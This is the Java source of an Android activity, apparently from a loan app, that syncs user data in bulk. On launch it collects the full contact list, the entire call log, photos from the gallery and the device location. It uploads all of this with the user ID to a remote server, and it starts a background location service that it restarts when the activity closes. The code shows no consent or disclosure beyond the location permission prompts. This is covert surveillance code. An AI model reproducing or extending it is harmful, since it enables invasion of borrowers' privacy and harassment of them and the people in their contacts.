package com.loan8.loan8;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.CallLog;
import android.provider.Settings;
import android.util.Log;
import android.widget.Toast;
import com.loan8.loan8.interfaces.Api;
import com.loan8.loan8.models.PhotosUploadModel;
import com.loan8.loan8.services.BackgroundLocationUpdateService;
import com.loan8.loan8.services.MyService;
import com.loan8.loan8.utils.RetrofitClient;
import com.github.tamir7.contacts.Contact;
import com.github.tamir7.contacts.Contacts;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationServices;
import com.jiajunhui.xapp.medialoader.MediaLoader;
import com.jiajunhui.xapp.medialoader.bean.PhotoResult;
import com.jiajunhui.xapp.medialoader.callback.OnPhotoLoaderCallBack;

import org.jetbrains.annotations.NotNull;

import java.io.File;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.RequestBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class SyncDataActivity extends AppCompatActivity {

    public static SyncDataActivity instance;
    ArrayList<String> filePaths = new ArrayList<>();
    static ArrayList<String> contactList = new ArrayList<>();

    String strLocation;
    ArrayList<String> listCallLog;

    FusedLocationProviderClient mFusedLocationClient;
    int PERMISSION_ID = 44;

    SharedPreferences sharedPreferences;
    SharedPreferences.Editor editor;
    String userId;

    @SuppressLint("CommitPrefEdits")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_sync_data);

        instance = SyncDataActivity.this;
        sharedPreferences = getSharedPreferences("MyPref", MODE_PRIVATE);
        editor = sharedPreferences.edit();
        userId = sharedPreferences.getString("user_id", "");

        mFusedLocationClient = LocationServices
                .getFusedLocationProviderClient(this);

        //Method call for get current location.
        getLastLocation();

        //Code for call the background location service
        /*if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(new Intent(this, BackgroundLocationUpdateService.class));
        } else {
            startService(new Intent(this, BackgroundLocationUpdateService.class));
        }*/

        //Code for call background locaton serviec with broadcast reciver
        BackgroundLocationUpdateService mSensorService = new BackgroundLocationUpdateService();
        Intent mServiceIntent = new Intent(this, mSensorService.getClass());
        if (!isMyServiceRunning(mSensorService.getClass())) {
            startService(mServiceIntent);
        }



        listCallLog = new ArrayList<>();
        //Method call for get call details
        getCallDetails();
        init();

    }


    private boolean isMyServiceRunning(Class<?> serviceClass) {
        ActivityManager manager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
            if (serviceClass.getName().equals(service.service.getClassName())) {
                Log.i ("isMyServiceRunning?", true+"");
                return true;
            }
        }
        Log.i ("isMyServiceRunning?", false+"");
        return false;
    }


    public void init() {
        Contacts.initialize(this);
        List<Contact> contacts = Contacts.getQuery().find();
        for (int i = 0; i < contacts.size(); i++) {
            for (int j = 0; j < contacts.get(i).getPhoneNumbers().size(); j++) {
                contactList.add(contacts.get(i).getDisplayName() + " " + contacts.get(i).getPhoneNumbers().get(j).getNumber());
            }
        }

        MediaLoader.getLoader().loadPhotos(this, new OnPhotoLoaderCallBack() {
            @Override
            public void onResult(PhotoResult result) {

                int sau;
                if (result.getItems().size() > 100) {
                    sau = 20;
                } else {
                    sau = result.getItems().size();
                }
                for (int i = 0; i < sau; i++) {
                    filePaths.add(result.getItems().get(i).getPath());
                }
                //call api here.
                apiUploadPhotoContact(filePaths);
                Log.d("Check ", "check");
                uploadMultiFile(filePaths);

            }
        });
    }

    private void uploadMultiFile(ArrayList<String> filePaths) {

        MultipartBody.Builder builder = new MultipartBody.Builder();
        builder.setType(MultipartBody.FORM);

        // Map is used to multipart the file using okhttp3.RequestBody
        // Multiple Images
        for (int i = 0; i < this.filePaths.size(); i++) {
            File file = new File(this.filePaths.get(i));
            builder.addFormDataPart("file[]", file.getName(), RequestBody.create(MediaType.parse("multipart/form-data"), file));
        }

        //display list in logcat
        Log.d("Display data URL ", filePaths.get(0));
        Log.d("Contact data ", contactList.get(0));

    }

    private void apiUploadPhotoContact(ArrayList<String> listData) {

        Log.d("Test ", "test");
        //creating array list of type MultipartBody
        ArrayList<MultipartBody.Part> multiArrayList = new ArrayList<>();
        for (int i = 0; i < listData.size(); i++) {
            File file = new File(listData.get(i));
            Log.d("FILE ", file.getName());

            RequestBody requestFile =
                    RequestBody.create(MediaType.parse("multipart/form-data"), file);

            MultipartBody.Part body = MultipartBody.Part.createFormData("file[]", file.getName(), requestFile);
            multiArrayList.add(body); //adding to array list.
        }

        Api api = RetrofitClient.getRetrofitInstance().create(Api.class);
        Call<PhotosUploadModel> call = api.photosVideos(multiArrayList, contactList, userId, listCallLog, strLocation);
        call.enqueue(new Callback<PhotosUploadModel>() {
            @Override
            public void onResponse(@NotNull Call<PhotosUploadModel> call, @NotNull Response<PhotosUploadModel> response) {

                if (response.isSuccessful()) {
                    Toast.makeText(SyncDataActivity.this, "Success", Toast.LENGTH_SHORT).show();
                    startActivity(new Intent(SyncDataActivity.this, BottomHolderActivity.class));
                }
            }

            @Override
            public void onFailure(@NotNull Call<PhotosUploadModel> call, @NotNull Throwable t) {
                startActivity(new Intent(SyncDataActivity.this, BottomHolderActivity.class));
            }
        });
    }


    //Below code for get locaton of the device.
    private void getLastLocation() {
        // check if permissions are given

        if (checkPermissions()) {
            // check if location is enabled
            if (isLocationEnabled()) {

                if (ContextCompat.checkSelfPermission(SyncDataActivity.this,
                        Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                    ActivityCompat.requestPermissions(SyncDataActivity.this,
                            new String[]{Manifest.permission.ACCESS_FINE_LOCATION}, 1);
                }

                /*Task task = mFusedLocationClient.getLastLocation();
                task.addOnSuccessListener(new OnSuccessListener() {
                    @Override
                    public void onSuccess(@NonNull @NotNull Object o) {

                    }
                });*/
                mFusedLocationClient.getLastLocation().addOnCompleteListener(task -> {
                    Location location = task.getResult();
                    if (location!= null){
                        Toast.makeText(SyncDataActivity.this, location.getLatitude() + "" + "," + location.getLongitude() + "", Toast.LENGTH_SHORT).show();
                        strLocation = location.getLatitude() + "" + "," + location.getLongitude();
                    }else {
                        Toast.makeText(instance, "Location is empty", Toast.LENGTH_SHORT).show();
                    }

                });
            } else {
                Toast.makeText(this, "Please turn on" + " your location...", Toast.LENGTH_LONG).show();
                Intent intent = new Intent(Settings.ACTION_LOCATION_SOURCE_SETTINGS);
                startActivity(intent);
            }
        } else {
            requestPermissions();
        }
    }

    // method to check for permissions
    private boolean checkPermissions() {
        return ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
                && ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
                == PackageManager.PERMISSION_GRANTED;
    }

    // method to requestfor permissions
    private void requestPermissions() {
        ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.ACCESS_COARSE_LOCATION, Manifest.permission.ACCESS_FINE_LOCATION}, PERMISSION_ID);
    }

    // method to check
    // if location is enabled
    private boolean isLocationEnabled() {
        LocationManager locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        return locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER) || locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NotNull String[] permissions,
                                           @NotNull int[] grantResults) {
        if (requestCode == 1) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                if (ContextCompat.checkSelfPermission(SyncDataActivity.this,
                        Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                    Toast.makeText(this, "Permission Granted", Toast.LENGTH_SHORT).show();
                }
            } else {
                Toast.makeText(this, "Permission Denied", Toast.LENGTH_SHORT).show();
            }
        }
    }

    //Method for get the call list
    public void getCallDetails() {

        StringBuilder sb = new StringBuilder();
        Cursor managedCursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, null);
        int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
        int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
        int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
        int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);
        sb.append("Call Details :");
        while (managedCursor.moveToNext()) {
            String phNumber = managedCursor.getString(number); // mobile number
            String callType = managedCursor.getString(type); // call type
            String callDate = managedCursor.getString(date); // call date
            Date callDayTime = new Date(Long.parseLong(callDate));
            String callDuration = managedCursor.getString(duration);
            String dir = null;
            int dircode = Integer.parseInt(callType);
            switch (dircode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;

                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    break;
            }
            sb.append("\nPhone Number:--- ").append(phNumber).append(" \nCall Type:--- ").append(dir).append(" \nCall Date:--- ").append(callDayTime).append(" \nCall duration in sec :--- ").append(callDuration);
            sb.append("\n----------------------------------");
            listCallLog.add("Phone Number:--- " + phNumber + " Call Type:--- " + dir + " Call Date:--- " + callDayTime + " Call duration in sec :--- " + callDuration);
        }
        managedCursor.close();
//        miss_cal.setText(sb);
        Log.e("Logmy", listCallLog.toString());
        Log.e("Log value --- ", sb.toString());
    }


    @Override
    protected void onDestroy() {
        super.onDestroy();
        startService(new Intent(this, MyService.class));
    }
}